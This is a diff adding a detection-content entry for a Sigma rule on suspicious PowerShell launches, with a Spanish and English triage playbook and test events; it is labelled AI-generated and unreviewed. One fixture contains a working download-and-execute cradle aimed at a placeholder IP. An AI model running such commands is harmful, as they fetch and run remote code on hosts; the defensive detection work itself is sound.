@@ -1,0 +1,136 @@
+{
+  "rule": {
+    "id": "536e2947-3729-478c-9903-745aaffe60d2",
+    "title": "Suspicious PowerShell Invocations - Specific - ProcessCreation",
+    "level": "medium",
+    "status": "test",
+    "author": "Nasreddine Bencherchali (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_powershell_invocation_specific.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_powershell_invocation_specific.yml",
+    "license": "DRL-1.1",
+    "techniques": []
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se inició un proceso de PowerShell con una combinación de parámetros típica de loaders maliciosos: ventana oculta, sin perfil, bypass de la política de ejecución, comandos codificados, decodificación Base64, descarga y ejecución en memoria o escritura en el registro bajo \\Software\\.",
+      "what_it_detects": "Eventos de creación de procesos cuyo CommandLine contiene todas las cadenas de alguno de seis patrones: -nop -w hidden -c con [Convert]::FromBase64String; ejecución oculta y no interactiva con iex y New-Object; -w hidden -ep bypass -Enc; powershell con reg add y \\software\\; -noprofile -windowstyle hidden bypass con descarga mediante System.Net.WebClient; o iex con New-Object Net.WebClient y .Download. Se excluye el instalador oficial de Chocolatey.",
+      "why_it_matters": "Estas combinaciones ocultan la ventana y evaden políticas para ejecutar código descargado o decodificado en memoria, algo habitual en stagers de acceso inicial y en persistencia mediante claves Run. Corresponde a la táctica de evasión/sigilo: uso de PowerShell (T1059.001), ventanas ocultas (T1564.003) y ofuscación (T1027).",
+      "triage_steps": [
+        "Lea el CommandLine completo e identifique qué patrón coincidió; decodifique el payload de -Enc (Base64 UTF-16LE) o FromBase64String en un sandbox, nunca en el equipo afectado.",
+        "Revise ParentImage y su línea de comandos: Office, navegadores, wscript, mshta o cmd lanzados por documentos elevan la sospecha; agentes RMM o SCCM pueden explicarlo.",
+        "Extraiga URL, dominios e IP del comando y busque conexiones del host en logs de proxy, DNS y firewall en +/- 15 minutos; valide su reputación.",
+        "En patrones reg add, identifique la clave (Run, RunOnce, Policies, Classes) y verifique el valor actual en el registro del host.",
+        "Revise procesos hijos, archivos creados y conexiones del mismo ProcessId; consulte los Script Block Logs (evento 4104) del mismo intervalo.",
+        "Pivote por usuario y host: tipo de inicio de sesión, alertas previas y la misma línea de comandos en otros endpoints de la organización.",
+        "Confirme con TI si una herramienta de despliegue o un script administrativo conocido origina la ejecución."
+      ],
+      "false_positives": [
+        "Instaladores y gestores de paquetes distintos del instalador de Chocolatey excluido que usan scripts de arranque con descarga en memoria.",
+        "Scripts de RMM, SCCM, Intune o GPO ejecutados ocultos con -ep bypass -Enc.",
+        "Scripts administrativos que usan reg add bajo HKLM\\Software; selection_reg es amplia porque basta con las subcadenas 'reg' y 'add'.",
+        "Ejercicios autorizados de red team o pruebas de penetración."
+      ],
+      "response_steps": [
+        "Si es malicioso o no tiene explicación, aísle el endpoint desde el EDR y preserve memoria, el payload decodificado y los artefactos.",
+        "Bloquee las URL, dominios e IP en proxy y firewall; busque los mismos indicadores en toda la flota.",
+        "Documente y exporte la persistencia encontrada (claves Run, tareas programadas) antes de eliminarla.",
+        "Restablezca las credenciales del usuario si se ejecutó con privilegios o hubo robo de credenciales; reinstale el equipo si se confirma el compromiso.",
+        "Si es legítimo, documéntelo y cree una exclusión acotada (padre exacto y comando o hash del script), nunca por cadenas genéricas."
+      ],
+      "severity_rationale": "El nivel medio es adecuado porque estos patrones se asocian fuertemente con stagers de malware, pero algunas herramientas administrativas y de despliegue los usan; el proceso padre y el payload determinan si se escala."
+    },
+    "en": {
+      "summary": "A PowerShell process started with a parameter combination typical of malicious loaders: hidden window, no profile, execution-policy bypass, encoded commands, Base64 decoding, in-memory download-and-execute, or registry writes under \\Software\\.",
+      "what_it_detects": "Process creation events whose CommandLine contains every string of one of six patterns: -nop -w hidden -c with [Convert]::FromBase64String; hidden non-interactive iex with New-Object; -w hidden -ep bypass -Enc; powershell with reg add and \\software\\; -noprofile -windowstyle hidden bypass with a System.Net.WebClient download; or iex with New-Object Net.WebClient and .Download. The official Chocolatey installer is excluded.",
+      "why_it_matters": "These combinations hide the window and skip policies to run code downloaded or decoded in memory, common in initial-access stagers and Run-key persistence. It maps to the stealth tactic: PowerShell abuse (T1059.001), hidden windows (T1564.003) and obfuscation (T1027).",
+      "triage_steps": [
+        "Read the full CommandLine and identify which pattern matched; decode any -Enc (UTF-16LE Base64) or FromBase64String payload in a sandbox, never on the affected host.",
+        "Check ParentImage and its command line: Office, browsers, wscript, mshta or document-spawned cmd raise suspicion; RMM or SCCM agents may explain it.",
+        "Extract URLs, domains and IPs from the command; search proxy, DNS and firewall logs for the host within +/- 15 minutes and check reputation.",
+        "For reg add patterns, identify the key (Run, RunOnce, Policies, Classes) and verify the current value on the host.",
+        "Review child processes, created files and network connections of the same ProcessId; pull Script Block Logs (event 4104) for the same window.",
+        "Pivot on user and host: logon type, earlier alerts, and the same command line on other endpoints.",
+        "Confirm with IT whether a known deployment tool or admin script launched it."
+      ],
+      "false_positives": [
+        "Installers and package managers other than the excluded Chocolatey installer that bootstrap with download cradles.",
+        "RMM, SCCM, Intune or GPO scripts run hidden with -ep bypass -Enc.",
+        "Admin scripts using reg add under HKLM\\Software; selection_reg is broad since the substrings 'reg' and 'add' suffice.",
+        "Authorized red team or penetration testing."
+      ],
+      "response_steps": [
+        "If malicious or unexplained, isolate the endpoint via EDR and preserve memory, the decoded payload and artifacts.",
+        "Block the URLs, domains and IPs at proxy and firewall; hunt for the same indicators fleet-wide.",
+        "Document and export any persistence (Run keys, scheduled tasks) before removing it.",
+        "Reset the user's credentials if it ran privileged or harvested credentials; reimage if compromise is confirmed.",
+        "If legitimate, document it and add a narrow exclusion (exact parent plus command or script hash), never generic strings."
+      ],
+      "severity_rationale": "Medium fits because these patterns are strongly linked to malware stagers, yet some admin and deployment tools use them; parent process and payload decide escalation."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Hidden PowerShell with execution-policy bypass and encoded command launched from Word (selection_enc).",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+          "CommandLine": "powershell.exe -nop -w hidden -ep bypass -Enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAB0AGUAcwB0AA==",
+          "ProcessId": 6120,
+          "ParentProcessId": 4388
+        }
+      },
+      {
+        "description": "In-memory download cradle with iex and Net.WebClient from an untrusted IP (selection_iex_webclient).",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0217.andes.example.com",
+          "User": "ANDES\\mlopez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "powershell.exe -c \"iex (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')\"",
+          "ProcessId": 7344,
+          "ParentProcessId": 7012
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Official Chocolatey installer; matches the WebClient patterns but is excluded by filter_chocolatey.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0301.andes.example.com",
+          "User": "ANDES\\admin.ti",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "powershell.exe -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command \"[System.Net.ServicePointManager]::SecurityProtocol = 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))\"",
+          "ProcessId": 5520,
+          "ParentProcessId": 5104
+        }
+      },
+      {
+        "description": "Scheduled inventory script run with bypass and hidden window but no encoding, download or full ' -w ' switch.",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-FILE01.andes.example.com",
+          "User": "ANDES\\svc_inventario",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+          "CommandLine": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Scripts\\inventory.ps1",
+          "ProcessId": 3388,
+          "ParentProcessId": 1020
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
